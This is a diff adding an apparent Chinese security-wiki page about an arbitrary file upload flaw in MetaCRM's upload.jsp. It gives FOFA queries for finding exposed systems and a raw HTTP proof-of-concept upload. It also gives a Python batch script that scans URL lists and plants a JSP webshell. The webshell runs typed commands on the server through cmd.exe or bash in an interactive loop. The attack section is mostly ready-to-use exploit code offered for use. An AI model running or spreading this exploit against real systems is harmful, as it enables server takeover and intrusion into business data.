@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MetaCRM/MetaCRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>MetaCRM客户关系管理系统任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "MetaCRM\u5ba2\u6237\u5173\u7cfb\u7ba1\u7406\u7cfb\u7edf\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "\u6279\u91cf\u811a\u672c", url: "#_1", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Metabase/Metabase%20geojson%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-41277/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Metabase/Metabase%20geojson%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-41277/" class="btn btn-xs btn-link">
+        Metabase geojson 任意文件读取漏洞 CVE-2021-41277
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        MetInfo 任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="metacrm">MetaCRM客户关系管理系统任意文件上传漏洞<a class="headerlink" href="#metacrm" title="Permanent link">&para;</a></h2>
+<p>MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。是建立在一种统一的架构上的技术领先的CRM系统。美特软件公司投资大量的时间与人力来开发MetaCRM，作为其旗舰产品，MetaCRM设计采用了最先进的因特网技术，因而它的架构支持统一的技术标准，融入了未来科技。建立在这种先进科技基础上的MetaCRM 5是一个技术领先的、稳定的客户关系管理解决方案。其upload.jsp接口存在任意文件上传漏洞，攻击者可通过改漏洞上传恶意脚本从而控制该系统。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>body=&quot;/common/scripts/basic.js&quot;
+product=&quot;美特软件-MetaCRM6&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST /develop/systparam/softlogo/upload.jsp?key=null&amp;form=null&amp;field=null&amp;filetitle=null&amp;folder=null&amp; HTTP/1.1
+Host: x.x.x.x
+Content-Length: 779
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Referer: http://x.x.x.x/develop/systparam/softlogo/file2.jsp
+Connection: close
+
+------WebKitFormBoundary0Mh3BfgWszxRFokh
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;klms.jsp&quot;
+Content-Type: text/plain
+
+&lt;% out.print(&quot;HelloWorldTest&quot;);new java.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;
+------WebKitFormBoundary0Mh3BfgWszxRFokh
+Content-Disposition: form-data; name=&quot;key&quot;
+
+null
+------WebKitFormBoundary0Mh3BfgWszxRFokh
+Content-Disposition: form-data; name=&quot;form&quot;
+
+null
+------WebKitFormBoundary0Mh3BfgWszxRFokh
+Content-Disposition: form-data; name=&quot;field&quot;
+
+null
+------WebKitFormBoundary0Mh3BfgWszxRFokh
+Content-Disposition: form-data; name=&quot;filetitile&quot;
+
+null
+------WebKitFormBoundary0Mh3BfgWszxRFokh
+Content-Disposition: form-data; name=&quot;filefolder&quot;
+
+null
+------WebKitFormBoundary0Mh3BfgWszxRFokh--
+</code></pre></div>
+<p>文件上传路径<code>http:127.0.0.1/userfile/default/userlogo/klms.jsp</code></p>
+<p><img alt="55ae9eec40d72e700bae5a4219b36662" src="https://github.com/wy876/POC/assets/139549762/d6a77031-9ae1-4658-b001-9da226b79444" /></p>
+<h2 id="_1">批量脚本<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="nn">string</span><span class="o">,</span><span class="nn">random</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urljoin</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
+<span class="n">ssl</span><span class="o">.</span><span class="n">_create_default_https_context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span>
+<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">read_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">urls</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">urls</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">generate_random_string</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+    <span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+    <span class="n">random_string</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">random_string</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">&quot;/develop/systparam/softlogo/upload.jsp?key=null&amp;form=null&amp;field=null&amp;filetitle=null&amp;folder=null&amp;&quot;</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh&quot;</span>
+    <span class="p">}</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;</span><span class="si">{}</span><span class="s2">.jsp&quot;</span><span class="se">\r\n</span><span class="s2">Content-Type: text/plain</span><span class="se">\r\n\r\n</span><span class="s2">&lt;</span><span class="si">% o</span><span class="s2">ut.print(&quot;HelloWorldTest&quot;);new java.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;key&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;form&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;field&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;filetitile&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;filefolder&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh--&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;userfile&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s1">&#39;parentForm&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;oForm\.elements\[&quot;null&quot;\]\.value=&quot;(.*?)&quot;&#39;</span>
+            <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">matches</span><span class="p">:</span>
+                <span class="n">extracted_path</span> <span class="o">=</span> <span class="n">matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">result_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">extracted_path</span><span class="p">)</span>
+                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">result_url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&quot;</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;HelloWorldTest&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31mDiscovered:</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">: metasoftCRM_upload_ArbitraryFileUploads!</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+                    <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">&quot;/develop/systparam/softlogo/upload.jsp?key=null&amp;form=null&amp;field=null&amp;filetitle=null&amp;folder=null&amp;&quot;</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh&quot;</span>
+    <span class="p">}</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+    <span class="n">data_template</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;replace1.jsp&quot;</span><span class="se">\r\n</span><span class="s2">Content-Type: text/plain</span><span class="se">\r\n\r\n</span><span class="s2">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%Process p=null;String  cmd = &quot;replace2&quot;;String os = System.getProperty(&quot;os.name&quot;).toLowerCase();if (os.contains(&quot;windows&quot;)) {p =  Runtime.getRuntime().exec(new String[]{&quot;cmd.exe&quot;,&quot;/c&quot;,cmd});}else{p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;, cmd});}if(cmd != null){InputStream input = p.getInputStream();InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);BufferedReader br = new BufferedReader(ins);out.print(&quot;&lt;pre&gt;&quot;);String line;while((line = br.readLine()) != null) {out.println(line);}out.print(&quot;&lt;/pre&gt;&quot;);br.close();ins.close();input.close();p.getOutputStream().close();}new java.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;key&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;form&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;field&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;filetitile&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=&quot;filefolder&quot;</span><span class="se">\r\n\r\n</span><span class="s2">null</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundary0Mh3BfgWszxRFokh--&quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+                <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[34mPlease input command (stop input:exit):</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+                <span class="k">if</span> <span class="s2">&quot;exit&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+                    <span class="n">data</span> <span class="o">=</span> <span class="n">data_template</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;replace1&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;replace2&#39;</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
+                    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;userfile&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s1">&#39;parentForm&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;oForm\.elements\[&quot;null&quot;\]\.value=&quot;(.*?)&quot;&#39;</span>
+                        <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+                        <span class="k">if</span> <span class="n">matches</span><span class="p">:</span>
+                            <span class="n">extracted_path</span> <span class="o">=</span> <span class="n">matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                            <span class="n">result_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">extracted_path</span><span class="p">)</span>
+                            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">result_url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&quot;</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+                            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                                <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">break</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-u&quot;</span><span class="p">,</span> <span class="s2">&quot;--url&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;URL&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-f&quot;</span><span class="p">,</span> <span class="s2">&quot;--txt&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;file&quot;</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">url</span>
+    <span class="n">txt</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">txt</span>
+    <span class="k">if</span> <span class="n">url</span><span class="p">:</span>
+        <span class="n">run</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">txt</span><span class="p">:</span>
+        <span class="n">urls</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">:</span>
+            <span class="n">check</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;help&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Metabase/Metabase%20geojson%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-41277/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Metabase/Metabase%20geojson%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-41277/" class="btn btn-xs btn-link">
+        Metabase geojson 任意文件读取漏洞 CVE-2021-41277
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        MetInfo 任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
